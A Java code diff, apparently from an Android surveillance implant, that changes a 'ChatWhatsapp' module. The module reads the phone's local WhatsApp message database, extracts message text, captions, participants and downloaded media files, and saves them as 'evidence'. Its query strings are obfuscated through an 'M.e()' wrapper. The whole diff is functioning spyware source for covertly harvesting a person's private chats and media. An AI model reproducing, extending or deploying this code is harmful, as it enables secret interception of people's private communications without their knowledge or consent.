@@ -43,7 +43,13 @@ import com.whatsapp.MediaData;
 
 public class ChatWhatsapp extends SubModuleChat {
 	private static final String TAG = "ChatWhatsapp";
-
+	private static final long ENTRY_NOT_INDB_REMOVE = 0;
+	private static final long MEDIA_NOT_INFS = 1;
+	private static final long MEDIA_STILL_NOT_DOWNLOADED = 2;
+	private static final long AGED_REMOVE = 3;
+	private static final long ENTRY_NULL = 4;
+	private static final long MEDIA_NOT_ACCESSIBLE = 5 ;
+	private static final long FETCK_SKIPPED_EXCEPTION = 6;
 	ChatGroups groups = new ChatWhatsappGroups();
 
 	private static final int PROGRAM = 0x06;
@@ -229,7 +235,7 @@ public class ChatWhatsapp extends SubModuleChat {
 							if (groups.isGroup(l.getValue()) && !groups.hasMemoizedGroup(l.getValue())) {
 								fetchGroup(helper, l.getValue());
 							}
-							if (fetchSkippedMultimedia(helper, l.getValue(), l.getKey(), (TreeMap<Long, String>) skippedMultimedia.clone())) {
+							if (fetchSkippedMultimedia(helper, l.getValue(), l.getKey())) {
 								// Remove the current element from the iterator and the list.
 								iterator.remove();
 								if (Cfg.DEBUG) {
@@ -633,7 +639,7 @@ public class ChatWhatsapp extends SubModuleChat {
 	 * @param conversation
 	 * @return
 	 */
-	private boolean fetchSkippedMultimedia(GenericSqliteHelper helper, String conversation, long lastWhatsapp,TreeMap<Long, String> skM) {
+	private boolean fetchSkippedMultimedia(GenericSqliteHelper helper, String conversation, final long lastWhatsapp) {
 
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (fetchSkippedMultimedia): " + conversation + " : lsw" + lastWhatsapp);
@@ -641,18 +647,149 @@ public class ChatWhatsapp extends SubModuleChat {
 
 
 		boolean res = false;
-		String peer = clean(conversation);
+		final String peer = clean(conversation);
+		final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
+		final ArrayList<MessageChatMultimedia> multimedias = new ArrayList<MessageChatMultimedia>();
 		String selection = M.e(" key_remote_jid = '") + conversation + M.e("' AND timestamp = ") + lastWhatsapp;
 
 		String[] projection = {M.e("_id"), M.e("key_remote_jid"), M.e("data"), M.e("timestamp"), M.e("key_from_me"), M.e("remote_resource"),
 				M.e("media_mime_type"), M.e("media_wa_type"), M.e("media_caption"), M.e("thumb_image"), M.e("raw_data"), M.e("media_size"), M.e("key_remote_jid")
 		};
+		RecordVisitor fmsrv = new RecordVisitor(projection, selection, M.e("timestamp")) {
 
-		FetchMessagesRecordVisitor fmsrv = new FetchMessagesRecordVisitor(peer, lastWhatsapp, projection, selection, M.e("timestamp"), skM);
+			@Override
+			public long cursor(Cursor cursor) {
+				boolean is_mm = false;
+				Long timestamp = cursor.getLong(3); // f_b
+				boolean incoming = cursor.getInt(4) != 1; // f_
+				String remote = clean(cursor.getString(5));
+				String mm_wa_type_str = cursor.getString(7);
+				int mm_wa_type = 0;
+				if(mm_wa_type_str != null){
+					try {
+						mm_wa_type = Integer.parseInt(mm_wa_type_str);
+					}catch (Exception e){
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (fetchSkippedMultimedia) Error parsingInt: " + mm_wa_type_str +"\n"+ e);
+						}
+						mm_wa_type = 0;
+						return FETCK_SKIPPED_EXCEPTION;
+					}
+				}
+				String mm_mime = "";
+				byte[] mm_serialize_obj = null;
+				int mm_size = 0;
+				String mm_media_caption = "";
+				try {
+					mm_mime = cursor.getString(6);
+					mm_serialize_obj = cursor.getBlob(9);
+					mm_media_caption = cursor.getString(8);
+					mm_size = cursor.getInt(11);
+				} catch (Exception e) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (fetchSkippedMultimedia) Error getting mm: " + e);
+					}
+					return FETCK_SKIPPED_EXCEPTION;
+				}
+			/* it can be a multimedia message , don't skip it only for message == empty*/
+				if ((mm_wa_type<1 || mm_wa_type > 4) ) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (fetchSkippedMultimedia), empty message");
+					}
+					return ENTRY_NULL;
+				}
+				if((mm_wa_type>=1 && mm_wa_type <= 3)){
+					is_mm = true;
+				}
+				String from = incoming ? peer : myPhoneNumber;
+				String to = incoming ? myPhoneNumber : peer;
+
+				if (groups.isGroup(peer)) {
+					if (incoming) {
+						from = remote;
+					} else {
+						// to = groups.getGroupTo(from, peer);
+					}
+					to = groups.getGroupToName(from, peer);
+				}
+				if (is_mm && to != null && from != null && mm_serialize_obj != null) {
+					try {
+						MediaData wamd = byteToWhatsappMediaData(mm_serialize_obj);
+						if (wamd != null && wamd.isTransferred() && wamd.getFile() != null && wamd.getFile().canRead()) {
+
+							multimedias.add(new MessageChatMultimedia(PROGRAM, new Date(timestamp), from, to, incoming, mm_media_caption, mm_mime, wamd.getFile(), mm_size));
+							if (mm_media_caption != null) {
+								messages.add(new MessageChat(PROGRAM, new Date(timestamp), from, to, mm_media_caption, incoming));
+							}
+							if (Cfg.DEBUG) {
+								Check.log(TAG + " (fetchSkippedMultimedia), valid, creating evidence , ready to be removed");
+							}
+							return lastWhatsapp;
+
+						} else if(wamd.isTransferred()) {
+							if (Cfg.DEBUG) {
+								Check.log(TAG + " (fetchSkippedMultimedia) Transferred but unavailable");
+							}
+							if (wamd != null && wamd.getFile() == null) {
+								if (Cfg.DEBUG) {
+									Check.log(TAG + " (fetchSkippedMultimedia) getFile == NULL is Transferred =" + wamd.isTransferred());
+								}
+								return MEDIA_NOT_INFS;
+							} else if (wamd != null && wamd.getFile() != null) {
+								if (Cfg.DEBUG) {
+									Check.log(TAG + " (fetchSkippedMultimedia) file=" + wamd.getFile().getAbsolutePath() + "can read =" + wamd.getFile().canRead());
+								}
+								return MEDIA_NOT_ACCESSIBLE;
+							}
+						}else{
+							if (Cfg.DEBUG) {
+								Check.log(TAG + " (fetchSkippedMultimedia) still not Transferred =" + wamd.isTransferred());
+							}
+							if (Utils.getDaysBetween(timestamp, new Date().getTime()) > OLDER_THEN_DAYS) {
+								if (Cfg.DEBUG) {
+									Check.log(TAG + " (fetchSkippedMultimedia) multimedia too old > days=" + OLDER_THEN_DAYS);
+									Check.log(TAG + " (fetchSkippedMultimedia), found but AGED ready to be removed");
+								}
+								return AGED_REMOVE;
+							}
+							return MEDIA_STILL_NOT_DOWNLOADED;
+						}
+					} catch (Exception e) {
+						if (Cfg.EXCEPTION) {
+							Check.log(e);
+						}
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (fetchSkippedMultimedia) Error: " + e);
+						}
+						return FETCK_SKIPPED_EXCEPTION;
+					}
+				} else {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (fetchSkippedMultimedia) Error, null values");
+					}
+				}
+				return ENTRY_NULL;
+			}
+		};
+		//FetchMessagesRecordVisitor fmsrv = new FetchMessagesRecordVisitor(peer, lastWhatsapp, projection, selection, M.e("timestamp"), skM);
 		long lastRead = helper.traverseRecords(M.e("messages"), fmsrv);
-		getModule().saveEvidence(fmsrv.getMessages());
-		getModule().saveEvidenceMultimedia(fmsrv.getMultimedias());
-		if(!fmsrv.getMultimedias().isEmpty()){
+		if(lastRead == lastWhatsapp){
+		getModule().saveEvidence(messages);
+		getModule().saveEvidenceMultimedia(multimedias);
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (fetchSkippedMultimedia) Removed skipped multimedia");
+			}
+			res = true;
+		}else if (lastRead == MEDIA_STILL_NOT_DOWNLOADED) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (fetchSkippedMultimedia) NOT Removed because still not downloaded");
+			}
+			res = false;
+		}else
+		{
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (fetchSkippedMultimedia) Removed skipped because error conditions!!");
+			}
 			res = true;
 		}
 		fmsrv = null;
